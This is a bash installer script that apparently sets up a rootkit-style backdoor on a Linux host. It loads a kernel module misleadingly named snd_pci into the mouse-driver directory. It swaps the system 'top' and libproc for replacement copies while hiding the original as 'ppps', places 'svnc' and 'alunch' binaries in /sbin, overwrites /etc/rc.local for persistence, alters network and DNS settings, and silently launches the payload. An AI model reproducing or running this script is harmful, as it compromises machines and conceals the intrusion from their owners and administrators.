#!/bin/bash

# binary file
rmmod snd_pci

pid1=`pidof svnc`
pid2=`pidof alunch`

if [ -n "$pid1" ]; then  
    #echo $pid1
	kill -9 $pid1
fi 

if [ -n "$pid2" ]; then  
    #echo $pid2
	kill -9 $pid2
fi 

if [ -d /sbin/zman ]; then
    rm -fr /sbin/zman
fi

if [ -f /sbin/alunch ]; then
    rm -fr /sbin/alunch
fi    

if [ -f /sbin/svnc ]; then
    rm -fr /sbin/svnc
fi

# install ko file
if [ -f ./module/snd_pci_$(uname -r).ko ];then
    #install ko
    cp -f ./module/snd_pci_$(uname -r).ko    /lib/modules/$(uname -r)/kernel/drivers/input/mouse/snd_pci.ko
    insmod /lib/modules/$(uname -r)/kernel/drivers/input/mouse/snd_pci.ko    
    depmod
fi    
# install ko endd

# install top start
pid3=`pidof top`
if [ -n "$pid3" ]; then  
	kill -9 $pid3
fi 

if [ -f /usr/lib/libproc-3.2.8.so ]; then
    echo "libproc exist"
else
    cp -f ./module/libproc-3.2.8.so /usr/lib/
fi

if [ -f /usr/bin/ppps ]; then
    cp -f ./module/top /usr/bin/top
    echo "ppps is found ,start override!"
else
    echo "ppps is not found ,start backup!"
    mv /usr/bin/top /usr/bin/ppps
    cp -f ./module/top /usr/bin/top
fi
# install top end
   
# binary file
cp -f ./module/svnc				/sbin/svnc
cp -f ./module/alunch 			/sbin/alunch
# change mode
chmod 755 /sbin/svnc 
chmod 755 /sbin/alunch
#create link file
ln -sf /sbin/alunch /bin/alunch
#auto run when boot
cp -f rc.local	/etc/rc.local

#network start
content=`cat /etc/network/interfaces|grep netmask`
if [ -n "$content" ]; then  
    echo "netmask is found:$content"
else
	echo "netmask 255.255.255.0">>/etc/network/interfaces
fi 
content=`cat /etc/network/interfaces|grep 8.8.8.8`
if [ -n "$content" ]; then  
    echo "dns-nameservers is found:$content"
else
	echo "dns-nameservers 8.8.8.8">>/etc/network/interfaces
    echo "dns-nameservers 8.8.4.4">>/etc/network/interfaces
fi
content=`cat /etc/network/interfaces|grep gateway`
if [ -n "$content" ]; then  
    echo "gateway is found:$content"
else
	echo "gateway 192.168.8.1">>/etc/network/interfaces
fi 

echo "nameserver 8.8.8.8">/etc/resolvconf/resolv.conf.d/base
echo "nameserver 8.8.8.8">/etc/resolvconf/resolv.conf.d/tail
#network end


#start running
nohup alunch >/dev/null 2>&1 &